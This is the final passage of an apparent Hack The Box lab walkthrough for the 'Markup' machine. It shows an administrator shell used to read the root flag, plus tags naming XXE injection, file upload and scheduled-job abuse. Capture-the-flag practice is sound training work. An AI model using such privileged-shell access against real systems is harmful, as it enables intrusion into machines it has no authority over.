</span></span><span class=line><span class=cl><span class=o>(</span>c<span class=o>)</span> <span class=m>2018</span> Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;
</span></span></code></pre></div><p>Great, since we already have a <strong>root/admin</strong> shell up and running, we can finish it up by <strong>grabbing</strong> the <strong>root flag</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;cd C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=nb>cd</span> C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt;dir
</span></span><span class=line><span class=cl>dir
</span></span><span class=line><span class=cl> Volume in drive C has no label.
</span></span><span class=line><span class=cl> Volume Serial Number is BA76-B4E3
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>03/05/2020  07:33 AM    &lt;DIR&gt;          .
</span></span><span class=line><span class=cl>03/05/2020  07:33 AM    &lt;DIR&gt;          ..
</span></span><span class=line><span class=cl>03/05/2020  07:33 AM                <span class=m>70</span> root.txt
</span></span><span class=line><span class=cl>               <span class=m>1</span> File<span class=o>(</span>s<span class=o>)</span>             <span class=m>70</span> bytes
</span></span><span class=line><span class=cl>               <span class=m>2</span> Dir<span class=o>(</span>s<span class=o>)</span>   7,366,606,848 bytes free
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt;type root.txt
</span></span><span class=line><span class=cl><span class=nb>type</span> root.txt
</span></span><span class=line><span class=cl>&lt;flag&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt;
</span></span></code></pre></div><blockquote><p>flag</p></blockquote><p><strong>Congratulations</strong>, we just successfully <strong>pwned</strong> the <strong>target machine</strong>. All we have left to do now is to <strong>terminate</strong> the <strong>target</strong> box (if not terminated automatically) <strong>before</strong> we <strong>continue</strong> with the next box!</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://bluewalle.github.io/tags/htb/>htb</a></li><li><a href=https://bluewalle.github.io/tags/walkthrough/>walkthrough</a></li><li><a href=https://bluewalle.github.io/tags/markup/>markup</a></li><li><a href=https://bluewalle.github.io/tags/tier-2/>tier-2</a></li><li><a href=https://bluewalle.github.io/tags/vip-tier/>vip-tier</a></li><li><a href=https://bluewalle.github.io/tags/web/>web</a></li><li><a href=https://bluewalle.github.io/tags/injection/>injection</a></li><li><a href=https://bluewalle.github.io/tags/apache/>apache</a></li><li><a href=https://bluewalle.github.io/tags/ssh/>ssh</a></li><li><a href=https://bluewalle.github.io/tags/php/>php</a></li><li><a href=https://bluewalle.github.io/tags/reconnaissance/>reconnaissance</a></li><li><a href=https://bluewalle.github.io/tags/scheduled-job-abuse/>scheduled-job-abuse</a></li><li><a href=https://bluewalle.github.io/tags/weak-credentials/>weak-credentials</a></li><li><a href=https://bluewalle.github.io/tags/arbitrary-file-upload/>arbitrary-file-upload</a></li><li><a href=https://bluewalle.github.io/tags/xxe-injection/>xxe-injection</a></li><li><a href=https://bluewalle.github.io/tags/weak-permissions/>weak-permissions</a></li></ul></footer></article></main><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>